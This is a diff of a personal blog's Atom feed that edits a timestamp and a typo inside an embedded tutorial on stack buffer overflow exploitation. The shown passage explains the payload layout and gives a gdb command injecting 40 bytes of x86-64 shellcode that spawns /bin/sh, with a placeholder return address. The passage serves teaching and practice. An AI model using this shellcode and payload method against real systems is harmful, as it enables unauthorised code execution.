@@ -9,7 +9,7 @@
   </author>
   <icon>https://l1ge.github.io/image/brand/icon-1-1.png</icon>
   <logo>https://l1ge.github.io/image/brand/icon-2-1.png</logo>
-  <updated>2020-05-19T14:16:08Z</updated>
+  <updated>2020-05-19T14:18:16Z</updated>
   <link rel="self" type="application/atom+xml" href="https://l1ge.github.io/feed.atom" hreflang="en-us"/>
   <link rel="alternate" type="text/html" href="https://l1ge.github.io/" hreflang="en-us"/>
   <entry>
@@ -161,7 +161,7 @@ RBP+0 found at offset: 144
 <h2>0x3 Finding the address of the shell code</h2>
 <p>Our payload will be 158 bytes in total : 152 to fill the buffer and 6 to override the return address pointing to the address of the shell code in the buffer.</p>
 <p>It will look like this:</p>
-<p>PAYLOAD = JUNK(100 bytes) + SHELL CODE (40 bytes) + JUNK (12 byes) + RETURN ADDRESS (6 bytes).  addresss</p>
+<p>PAYLOAD = JUNK(100 bytes) + SHELL CODE (40 bytes) + JUNK (12 byes) + RETURN ADDRESS (6 bytes).</p>
 <p>There are no specific reason why I put 100 bytes before and 12 bytes after the shellcode. You can try different things as long as the total without the return address is 152.</p>
 <p>Let's fill the junk with 'A's for now, and our return address with 6*'B'</p>
 <pre><code class="language-bash">(gdb) run $(python -c &quot;print 'A'*100+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + 'B'*6&quot;)
